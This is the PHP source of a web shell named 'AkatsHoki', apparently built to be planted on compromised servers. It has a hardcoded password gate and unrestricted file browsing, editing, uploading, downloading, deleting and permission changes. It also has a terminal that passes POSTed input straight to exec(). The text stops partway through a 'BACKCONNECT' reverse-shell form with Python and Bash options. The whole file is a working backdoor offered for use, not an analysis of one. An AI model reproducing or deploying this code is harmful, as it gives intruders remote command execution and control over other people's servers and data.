<?php
session_start();
error_reporting(0);

// Nama shell dan password sesuai permintaan
define('SHELL_NAME', 'AkatsHoki');
define('LOGIN_PASS', 'ImJustTrashForYou');

function securePath($path) {
    if (empty($path)) {
        return getcwd();
    }
    
    $realPath = realpath($path);
    if ($realPath === false) {
        return getcwd();
    }
    
    return $realPath;
}

function listDirectories($dirPath) {
    $dirPath = securePath($dirPath);
    if (!$dirPath || !is_dir($dirPath)) {
        return "<div class='error-box'><i class='fas fa-exclamation-triangle'></i> Invalid directory access.</div>";
    }
    
    $rootPath = DIRECTORY_SEPARATOR;
    $breadcrumb = "<nav class='breadcrumb'>";
    $parts = explode(DIRECTORY_SEPARATOR, trim($dirPath, DIRECTORY_SEPARATOR));
    $currentPath = $rootPath;
    $breadcrumb .= "<a href='?dir=" . urlencode($rootPath) . "'><i class='fas fa-home'></i></a> / ";
    
    foreach ($parts as $part) {
        if ($part === "") continue;
        $currentPath .= $part . DIRECTORY_SEPARATOR;
        $breadcrumb .= "<a href='?dir=" . urlencode($currentPath) . "'>" . htmlspecialchars($part) . "</a> / ";
    }
    
    $breadcrumb = rtrim($breadcrumb, " / ") . "</nav>";
    
    $output = $breadcrumb;
    
    $items = @scandir($dirPath);
    if ($items === false) {
        return "<div class='error-box'><i class='fas fa-exclamation-circle'></i> Cannot read directory</div>";
    } else {
        $output .= "<div class='file-manager'>";
        
        // Folder section
        $output .= "<div class='section-title'><i class='fas fa-folder'></i> Folders</div>";
        $output .= "<div class='folders-grid'>";
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            
            $itemPath = $dirPath . DIRECTORY_SEPARATOR . $item;
            $realItemPath = realpath($itemPath);
            if (!$realItemPath || !is_dir($realItemPath)) continue;
            
            $encodedPath = urlencode($realItemPath);
            $modified = @filemtime($realItemPath) ? date("Y-m-d H:i", @filemtime($realItemPath)) : '-';
            $perms = @fileperms($realItemPath);
            $isLocked = (($perms & 0777) == 0555);
            
            $output .= "<div class='folder-item'>";
            $output .= "<div class='folder-icon'>";
            $output .= "<i class='fas fa-folder'></i>";
            if ($isLocked) {
                $output .= "<span class='lock-badge'><i class='fas fa-lock'></i></span>";
            }
            $output .= "</div>";
            $output .= "<div class='folder-info'>";
            $output .= "<a href='?dir=" . $encodedPath . "' class='folder-name'>" . htmlspecialchars($item) . "</a>";
            $output .= "<div class='folder-meta'>";
            $output .= "<span><i class='far fa-clock'></i> " . $modified . "</span>";
            $output .= "</div>";
            $output .= "</div>";
            $output .= "<div class='folder-actions'>";
            $output .= "<button onclick=\"lockUnlockItem('" . addslashes($realItemPath) . "', true)\" title='" . ($isLocked ? "Unlock" : "Lock") . "'><i class='fas " . ($isLocked ? "fa-lock-open" : "fa-lock") . "'></i></button>";
            $output .= "<button onclick=\"renameItem('" . addslashes($realItemPath) . "', true)\" title='Rename'><i class='fas fa-i-cursor'></i></button>";
            $output .= "<button onclick=\"deleteItem('" . $encodedPath . "')\" title='Delete' class='delete-btn'><i class='fas fa-trash'></i></button>";
            $output .= "</div>";
            $output .= "</div>";
        }
        
        $output .= "</div>";
        
        // Files section
        $output .= "<div class='section-title'><i class='fas fa-file'></i> Files</div>";
        $output .= "<div class='files-table-container'>";
        $output .= "<table class='files-table'>";
        $output .= "<thead>
            <tr>
                <th><i class='fas fa-file'></i> Name</th>
                <th><i class='fas fa-weight-hanging'></i> Size</th>
                <th><i class='far fa-clock'></i> Modified</th>
                <th><i class='fas fa-lock'></i> Perms</th>
                <th><i class='fas fa-user'></i> Owner</th>
                <th><i class='fas fa-cogs'></i> Actions</th>
            </tr>
        </thead><tbody>";
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            
            $itemPath = $dirPath . DIRECTORY_SEPARATOR . $item;
            $realItemPath = realpath($itemPath);
            if (!$realItemPath || is_dir($realItemPath)) continue;
            
            $encodedPath = urlencode($realItemPath);
            $size = formatSize(@filesize($realItemPath));
            $modified = @filemtime($realItemPath) ? date("Y-m-d H:i", @filemtime($realItemPath)) : '-';
            $perms = @fileperms($realItemPath);
            $isLocked = (($perms & 0777) == 0444);
            $permissions = getFilePermissions($realItemPath);
            
            $owner = 'N/A';
            if (function_exists('posix_getpwuid')) {
                $ownerInfo = @posix_getpwuid(@fileowner($realItemPath));
                $owner = $ownerInfo['name'] ?? 'N/A';
            }
            
            $fileExt = pathinfo($item, PATHINFO_EXTENSION);
            $fileIcon = getFileIcon($fileExt);
            
            $output .= "<tr>";
            $output .= "<td><div class='file-cell'><i class='" . $fileIcon . "'></i> <span class='file-name'>" . htmlspecialchars($item) . "</span></div></td>";
            $output .= "<td>" . $size . "</td>";
            $output .= "<td>" . $modified . "</td>";
            $output .= "<td><span class='perms-badge " . ($isLocked ? 'locked' : 'unlocked') . "'>" . $permissions . "</span></td>";
            $output .= "<td>" . $owner . "</td>";
            $output .= "<td><div class='file-actions'>";
            $output .= "<button onclick=\"lockUnlockItem('" . addslashes($realItemPath) . "')\" title='" . ($isLocked ? "Unlock" : "Lock") . "' class='action-btn " . ($isLocked ? 'locked' : '') . "'><i class='fas " . ($isLocked ? "fa-lock-open" : "fa-lock") . "'></i></button>";
            $output .= "<a href='?edit=" . $encodedPath . "' title='Edit' class='action-btn edit'><i class='fas fa-edit'></i></a>";
            $output .= "<button onclick=\"renameItem('" . addslashes($realItemPath) . "')\" title='Rename' class='action-btn rename'><i class='fas fa-i-cursor'></i></button>";
            $output .= "<a href='?download=" . $encodedPath . "' title='Download' class='action-btn download'><i class='fas fa-download'></i></a>";
            $output .= "<button onclick=\"deleteItem('" . $encodedPath . "')\" title='Delete' class='action-btn delete'><i class='fas fa-trash'></i></button>";
            $output .= "</div></td>";
            $output .= "</tr>";
        }
        
        $output .= "</tbody></table></div></div>";
    }
    
    return $output;
}

function getFileIcon($extension) {
    $icons = [
        'php' => 'fab fa-php',
        'js' => 'fab fa-js',
        'html' => 'fab fa-html5',
        'css' => 'fab fa-css3',
        'py' => 'fab fa-python',
        'java' => 'fab fa-java',
        'json' => 'fas fa-code',
        'xml' => 'fas fa-code',
        'sql' => 'fas fa-database',
        'jpg' => 'fas fa-image',
        'jpeg' => 'fas fa-image',
        'png' => 'fas fa-image',
        'gif' => 'fas fa-image',
        'pdf' => 'fas fa-file-pdf',
        'doc' => 'fas fa-file-word',
        'docx' => 'fas fa-file-word',
        'xls' => 'fas fa-file-excel',
        'xlsx' => 'fas fa-file-excel',
        'zip' => 'fas fa-file-archive',
        'rar' => 'fas fa-file-archive',
        'txt' => 'fas fa-file-alt',
        'mp3' => 'fas fa-file-audio',
        'mp4' => 'fas fa-file-video',
    ];
    
    return $icons[strtolower($extension)] ?? 'fas fa-file';
}

function formatSize($bytes) {
    if ($bytes <= 0) return '0 B';
    
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    $factor = min($factor, count($sizes) - 1);
    
    return sprintf("%.2f", $bytes / pow(1024, $factor)) . " " . $sizes[$factor];
}

function getFilePermissions($filePath) {
    if (!file_exists($filePath)) {
        return 'N/A';
    }
    
    $perms = fileperms($filePath);
    $info = '';
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    
    return $info;
}

// Session handling
function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Handle login POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !isset($_POST['command'])) {
    if ($_POST['password'] === LOGIN_PASS) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'akatsuki';
        header('Location: ?');
        exit;
    } else {
        $error = "Kau Siapa Kontoll,Berani2nya Memasuki Hatiku Ini!!!";
    }
}

// Check login
if (!is_logged_in()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo SHELL_NAME; ?> - Akatsuki</title>
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Exo 2', sans-serif;
                background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
                color: #fff;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                position: relative;
            }
            
            .login-container {
                background: rgba(20, 0, 0, 0.95);
                border: 1px solid rgba(255, 0, 0, 0.3);
                border-radius: 20px;
                padding: 60px 50px;
                width: 100%;
                max-width: 500px;
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
                position: relative;
                z-index: 1;
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 40px;
            }
            
            .akatsuki-logo {
                font-size: 80px;
                color: #ff0000;
                margin-bottom: 20px;
            }
            
            .shell-title {
                font-family: 'Orbitron', sans-serif;
                font-size: 36px;
                font-weight: 900;
                color: #ff0000;
                letter-spacing: 2px;
                margin-bottom: 10px;
                text-transform: uppercase;
            }
            
            .login-form {
                position: relative;
            }
            
            .input-group {
                position: relative;
                margin-bottom: 30px;
            }
            
            .input-group i {
                position: absolute;
                left: 20px;
                top: 50%;
                transform: translateY(-50%);
                color: #ff0000;
                font-size: 20px;
            }
            
            .password-input {
                width: 100%;
                padding: 20px 20px 20px 60px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid rgba(255, 0, 0, 0.3);
                border-radius: 12px;
                color: #fff;
                font-size: 18px;
                font-family: 'Exo 2', sans-serif;
                transition: all 0.3s ease;
            }
            
            .password-input:focus {
                outline: none;
                border-color: #ff0000;
                background: rgba(255, 0, 0, 0.05);
            }
            
            .login-btn {
                width: 100%;
                padding: 20px;
                background: linear-gradient(45deg, #ff0000, #cc0000);
                border: none;
                border-radius: 12px;
                color: white;
                font-family: 'Orbitron', sans-serif;
                font-size: 18px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .login-btn:hover {
                background: linear-gradient(45deg, #ff3333, #ff0000);
            }
            
            .error {
                color: #ff0000;
                text-align: center;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <div class="akatsuki-logo">
                    <i class="fas fa-cloud"></i>
                </div>
                <h1 class="shell-title"><?php echo SHELL_NAME; ?></h1>
                <div style="color: #ff6666;">t.me/alsysangseniman</div>
            </div>
            
            <?php if (isset($error)): ?>
                <div class="error"><?php echo $error; ?></div>
            <?php endif; ?>
            
            <form method="post" class="login-form">
                <div class="input-group">
                    <i class="fas fa-key"></i>
                    <input type="password" name="password" class="password-input" placeholder="Enter Password" required autofocus>
                </div>
                <button type="submit" class="login-btn">
                    <i class="fas fa-sign-in-alt"></i> ACCESS
                </button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Main application - only reached if logged in

// Get current directory
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$currentDir = securePath($currentDir);

// Handle file upload via GET
if (isset($_FILES['uploaded_file'])) {
    $targetFile = $currentDir . DIRECTORY_SEPARATOR . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile)) {
        echo "<script>alert('File uploaded successfully!'); window.location.href = '?dir=" . urlencode($currentDir) . "';</script>";
    } else {
        echo "<script>alert('Failed to upload file!'); window.location.href = '?dir=" . urlencode($currentDir) . "';</script>";
    }
    exit;
}

// Handle GET actions
if (isset($_GET['delete'])) {
    $deletePath = urldecode($_GET['delete']);
    if (file_exists($deletePath)) {
        if (is_dir($deletePath)) {
            @rmdir($deletePath);
        } else {
            @unlink($deletePath);
        }
    }
    header("Location: ?dir=" . urlencode(dirname($deletePath)));
    exit;
}

if (isset($_GET['download'])) {
    $filePath = urldecode($_GET['download']);
    if (file_exists($filePath) && is_file($filePath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    }
}

if (isset($_GET['edit'])) {
    $filePath = urldecode($_GET['edit']);
    if (isset($_POST['save_file'])) {
        file_put_contents($filePath, $_POST['file_content']);
        header("Location: ?dir=" . urlencode(dirname($filePath)));
        exit;
    }
    
    $content = htmlspecialchars(file_get_contents($filePath));
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Edit File</title>
        <style>
            body { background: #0a0a0a; color: white; padding: 20px; }
            textarea { width: 100%; height: 500px; background: #1a0000; color: white; border: 1px solid #ff0000; padding: 10px; }
            input[type="submit"] { background: #ff0000; color: white; border: none; padding: 10px 20px; margin-top: 10px; cursor: pointer; }
        </style>
    </head>
    <body>
        <h3>Editing: ' . basename($filePath) . '</h3>
        <form method="post">
            <textarea name="file_content">' . $content . '</textarea><br>
            <input type="submit" name="save_file" value="Save">
            <a href="?dir=' . urlencode(dirname($filePath)) . '" style="color: #ff6666; margin-left: 10px;">Cancel</a>
        </form>
    </body>
    </html>';
    exit;
}

if (isset($_GET['lockunlock'])) {
    $itemPath = urldecode($_GET['lockunlock']);
    if (file_exists($itemPath)) {
        $perms = fileperms($itemPath);
        if (is_dir($itemPath)) {
            $newPerms = ($perms & 0777) == 0555 ? 0755 : 0555;
        } else {
            $newPerms = ($perms & 0777) == 0444 ? 0644 : 0444;
        }
        chmod($itemPath, $newPerms);
    }
    header("Location: ?dir=" . urlencode(dirname($itemPath)));
    exit;
}

// Handle rename operations via POST
if (isset($_POST['rename_file']) && isset($_POST['rename']) && isset($_POST['new_name'])) {
    $oldPath = $_POST['rename'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if (rename($oldPath, $newPath)) {
        echo "<script>alert('File renamed successfully!'); window.location.href = '?dir=" . urlencode(dirname($oldPath)) . "';</script>";
    } else {
        echo "<script>alert('Failed to rename file!'); window.location.href = '?dir=" . urlencode(dirname($oldPath)) . "';</script>";
    }
    exit;
}

if (isset($_POST['rename_dir_submit']) && isset($_POST['rename_dir']) && isset($_POST['new_name'])) {
    $oldPath = $_POST['rename_dir'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if (rename($oldPath, $newPath)) {
        echo "<script>alert('Folder renamed successfully!'); window.location.href = '?dir=" . urlencode(dirname($oldPath)) . "';</script>";
    } else {
        echo "<script>alert('Failed to rename folder!'); window.location.href = '?dir=" . urlencode(dirname($oldPath)) . "';</script>";
    }
    exit;
}

// Handle new folder/file via POST
if (isset($_POST['new_folder']) && isset($_POST['folder_name'])) {
    $newDir = $currentDir . DIRECTORY_SEPARATOR . $_POST['folder_name'];
    if (!is_dir($newDir)) {
        mkdir($newDir, 0755, true);
        echo "<script>alert('Folder created successfully!'); window.location.href = '?dir=" . urlencode($currentDir) . "';</script>";
    } else {
        echo "<script>alert('Folder already exists!'); window.location.href = '?dir=" . urlencode($currentDir) . "';</script>";
    }
    exit;
}

if (isset($_POST['new_file']) && isset($_POST['file_name'])) {
    $newFile = $currentDir . DIRECTORY_SEPARATOR . $_POST['file_name'];
    if (!file_exists($newFile)) {
        touch($newFile);
        echo "<script>alert('File created successfully!'); window.location.href = '?dir=" . urlencode($currentDir) . "';</script>";
    } else {
        echo "<script>alert('File already exists!'); window.location.href = '?dir=" . urlencode($currentDir) . "';</script>";
    }
    exit;
}

// Handle terminal command via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = [];
    $return_var = 0;
    @exec($command . ' 2>&1', $output, $return_var);
    echo '<pre style="background: #000; color: #0f0; padding: 10px; border-radius: 5px; margin: 0;">' . htmlspecialchars(implode("\n", $output)) . '</pre>';
    exit;
}

// Display main interface
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo SHELL_NAME; ?> - AkatsHoki - Lupakan Diriku Jika Dirimu Lebih Memilih Dirinya</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --akatsuki-red: #ff0000;
            --akatsuki-dark: #0a0a0a;
            --akatsuki-darker: #1a0000;
            --akatsuki-light: #ff4444;
            --akatsuki-lighter: #ff6666;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Exo 2', sans-serif;
            background: linear-gradient(135deg, var(--akatsuki-dark) 0%, var(--akatsuki-darker) 100%);
            color: #fff;
            min-height: 100vh;
        }
        
        /* Header */
        .header {
            background: rgba(20, 0, 0, 0.9);
            border-bottom: 1px solid rgba(255, 0, 0, 0.3);
            padding: 20px 40px;
            position: sticky;
            top: 0;
            z-index: 1000;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }
        
        .logo-section {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .logo {
            font-size: 36px;
            color: var(--akatsuki-red);
        }
        
        .title-section h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            font-weight: 900;
            color: var(--akatsuki-red);
            letter-spacing: 1px;
        }
        
        .server-info {
            background: rgba(255, 0, 0, 0.1);
            padding: 10px 20px;
            border-radius: 10px;
            border: 1px solid rgba(255, 0, 0, 0.2);
            font-size: 12px;
            font-family: 'Courier New', monospace;
        }
        
        /* Main Container */
        .main-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px;
        }
        
        /* Quick Actions */
        .quick-actions {
            background: rgba(20, 0, 0, 0.8);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        
        .action-card {
            background: linear-gradient(135deg, rgba(255, 0, 0, 0.1), rgba(255, 68, 68, 0.05));
            border: 1px solid rgba(255, 0, 0, 0.2);
            border-radius: 12px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            transition: all 0.3s ease;
            cursor: pointer;
            text-decoration: none;
            color: inherit;
        }
        
        .action-card:hover {
            transform: translateY(-5px);
            border-color: var(--akatsuki-red);
            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.2);
        }
        
        .action-icon {
            font-size: 32px;
            color: var(--akatsuki-red);
            width: 70px;
            height: 70px;
            background: rgba(255, 0, 0, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid rgba(255, 0, 0, 0.3);
        }
        
        /* File Manager */
        .file-manager {
            background: rgba(20, 0, 0, 0.8);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
        }
        
        .breadcrumb {
            background: rgba(255, 0, 0, 0.1);
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            font-family: 'Courier New', monospace;
            border: 1px solid rgba(255, 0, 0, 0.2);
        }
        
        .breadcrumb a {
            color: var(--akatsuki-lighter);
            text-decoration: none;
        }
        
        .section-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            margin: 30px 0 20px 0;
            color: var(--akatsuki-red);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .folders-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }
        
        .folder-item {
            background: rgba(255, 0, 0, 0.05);
            border: 1px solid rgba(255, 0, 0, 0.2);
            border-radius: 12px;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            transition: all 0.3s ease;
        }
        
        .folder-item:hover {
            background: rgba(255, 0, 0, 0.1);
            border-color: var(--akatsuki-red);
        }
        
        .folder-icon {
            position: relative;
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, rgba(255, 0, 0, 0.2), rgba(255, 68, 68, 0.1));
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: #ffcc00;
        }
        
        .lock-badge {
            position: absolute;
            top: -5px;
            right: -5px;
            background: var(--akatsuki-red);
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }
        
        .folder-info {
            flex: 1;
        }
        
        .folder-name {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
            display: block;
            margin-bottom: 5px;
        }
        
        .folder-meta {
            display: flex;
            gap: 15px;
            color: var(--akatsuki-lighter);
            font-size: 12px;
        }
        
        .folder-actions {
            display: flex;
            gap: 8px;
        }
        
        .folder-actions button {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.3);
            color: white;
            width: 36px;
            height: 36px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .folder-actions button:hover {
            background: var(--akatsuki-red);
        }
        
        /* Files Table */
        .files-table-container {
            overflow-x: auto;
        }
        
        .files-table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(10, 0, 0, 0.8);
        }
        
        .files-table th {
            padding: 18px 20px;
            text-align: left;
            font-family: 'Orbitron', sans-serif;
            font-weight: 600;
            color: var(--akatsuki-red);
            font-size: 14px;
            border-bottom: 2px solid rgba(255, 0, 0, 0.3);
        }
        
        .files-table td {
            padding: 16px 20px;
            border-bottom: 1px solid rgba(255, 0, 0, 0.1);
        }
        
        .file-cell {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .perms-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            font-weight: bold;
        }
        
        .perms-badge.unlocked {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
        }
        
        .perms-badge.locked {
            background: rgba(255, 0, 0, 0.1);
            color: var(--akatsuki-red);
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
        }
        
        .action-btn {
            width: 36px;
            height: 36px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            text-decoration: none;
            color: white;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border: none;
        }
        
        .action-btn:hover {
            transform: scale(1.1);
        }
        
        .action-btn.edit:hover {
            background: #2196F3;
        }
        
        .action-btn.rename:hover {
            background: #FF9800;
        }
        
        .action-btn.download:hover {
            background: #4CAF50;
        }
        
        .action-btn.delete:hover {
            background: #F44336;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 2000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .modal-content {
            background: linear-gradient(135deg, rgba(20, 0, 0, 0.95), rgba(40, 0, 0, 0.9));
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 600px;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .modal-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            color: var(--akatsuki-red);
        }
        
        .close-btn {
            background: none;
            border: none;
            color: var(--akatsuki-lighter);
            font-size: 28px;
            cursor: pointer;
        }
        
        .modal-input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 0, 0, 0.3);
            border-radius: 12px;
            color: white;
            font-size: 16px;
            margin-bottom: 20px;
        }
        
        .cmd-output {
            background: rgba(0, 0, 0, 0.8);
            color: #00ff00;
            padding: 20px;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid rgba(0, 255, 0, 0.3);
            margin-top: 20px;
        }
        
        .modal-buttons {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }
        
        .modal-btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .modal-btn.primary {
            background: linear-gradient(45deg, var(--akatsuki-red), var(--akatsuki-light));
            color: white;
        }
        
        .modal-btn.secondary {
            background: #333;
            color: white;
        }
        
        /* Upload Form */
        .upload-area {
            border: 2px dashed rgba(255, 0, 0, 0.3);
            border-radius: 15px;
            padding: 40px;
            text-align: center;
            margin: 20px 0;
            background: rgba(255, 0, 0, 0.05);
            cursor: pointer;
        }
        
        .upload-area:hover {
            border-color: var(--akatsuki-red);
            background: rgba(255, 0, 0, 0.1);
        }
        
        .upload-area input[type="file"] {
            display: none;
        }
        
        .upload-label {
            display: inline-block;
            padding: 16px 32px;
            background: linear-gradient(45deg, var(--akatsuki-red), var(--akatsuki-light));
            color: white;
            border-radius: 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 600;
            cursor: pointer;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                text-align: center;
            }
            
            .quick-actions {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .folders-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        
        @media (max-width: 480px) {
            .quick-actions {
                grid-template-columns: 1fr;
            }
            
            .folders-grid {
                grid-template-columns: 1fr;
            }
            
            .files-table th,
            .files-table td {
                padding: 10px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="logo-section">
            <div class="logo">
                <i class="fas fa-cloud"></i>
            </div>
            <div class="title-section">
                <h1><?php echo SHELL_NAME; ?></h1>
                <div style="color: #ff6666; font-size: 12px;">AkatsHoki - Lupakan Diriku Jika Dirimu Lebih Memilih Dirinya</div>
            </div>
        </div>
        <div class="server-info">
            <i class="fas fa-server"></i> <?php echo php_uname('s'); ?> | 
            <i class="fas fa-microchip"></i> PHP <?php echo phpversion(); ?>
        </div>
    </div>
    
    <!-- Main Container -->
    <div class="main-container">
        <!-- Quick Actions -->
        <div class="quick-actions">
            <div class="action-card" onclick="openModal('cmdModal')">
                <div class="action-icon">
                    <i class="fas fa-terminal"></i>
                </div>
                <div style="font-family: 'Orbitron', sans-serif; font-size: 16px;">TERMINAL</div>
            </div>
            
            <div class="action-card" onclick="openModal('backconnectModal')">
                <div class="action-icon">
                    <i class="fas fa-plug"></i>
                </div>
                <div style="font-family: 'Orbitron', sans-serif; font-size: 16px;">BACKCONNECT</div>
            </div>
            
            <div class="action-card" onclick="createFolderPrompt()">
                <div class="action-icon">
                    <i class="fas fa-folder-plus"></i>
                </div>
                <div style="font-family: 'Orbitron', sans-serif; font-size: 16px;">NEW FOLDER</div>
            </div>
            
            <div class="action-card" onclick="createFilePrompt()">
                <div class="action-icon">
                    <i class="fas fa-file-plus"></i>
                </div>
                <div style="font-family: 'Orbitron', sans-serif; font-size: 16px;">NEW FILE</div>
            </div>
            
            <div class="action-card" onclick="document.getElementById('fileUpload').click()">
                <div class="action-icon">
                    <i class="fas fa-upload"></i>
                </div>
                <div style="font-family: 'Orbitron', sans-serif; font-size: 16px;">UPLOAD FILE</div>
            </div>
            
            <a href="?logout" class="action-card" style="text-decoration: none;">
                <div class="action-icon">
                    <i class="fas fa-sign-out-alt"></i>
                </div>
                <div style="font-family: 'Orbitron', sans-serif; font-size: 16px;">LOGOUT</div>
            </a>
        </div>
        
        <!-- Upload Form -->
        <form method="post" enctype="multipart/form-data" id="uploadForm">
            <div class="upload-area" onclick="document.getElementById('fileUpload').click()">
                <input type="file" name="uploaded_file" id="fileUpload" onchange="uploadFile()">
                <div class="upload-label">
                    <i class="fas fa-cloud-upload-alt"></i> CLICK TO UPLOAD FILE
                </div>
                <p style="margin-top: 15px; color: var(--akatsuki-lighter);">
                    Click above or drag and drop file here
                </p>
            </div>
        </form>
        
        <!-- File Manager -->
        <?php echo listDirectories($currentDir); ?>
    </div>
    
    <!-- Modals -->
    <div id="cmdModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title"><i class="fas fa-terminal"></i> TERMINAL</h3>
                <button class="close-btn" onclick="closeModal('cmdModal')">&times;</button>
            </div>
            <input type="text" id="cmdInput" class="modal-input" placeholder="Enter command..." autocomplete="off" onkeypress="if(event.key === 'Enter') executeCmd()">
            <div class="modal-buttons">
                <button class="modal-btn primary" onclick="executeCmd()">
                    <i class="fas fa-play"></i> EXECUTE
                </button>
                <button class="modal-btn secondary" onclick="closeModal('cmdModal')">
                    <i class="fas fa-times"></i> CLOSE
                </button>
            </div>
            <div id="cmdOutput" class="cmd-output"></div>
        </div>
    </div>
    
    <div id="backconnectModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title"><i class="fas fa-plug"></i> BACKCONNECT</h3>
                <button class="close-btn" onclick="closeModal('backconnectModal')">&times;</button>
            </div>
            <input type="text" id="ipAddress" class="modal-input" placeholder="IP Address" value="127.0.0.1">
            <input type="text" id="port" class="modal-input" placeholder="Port" value="4444">
            <select id="backconnectType" class="modal-input">
                <option value="python">Python</option>
                <option value="bash">Bash</option>
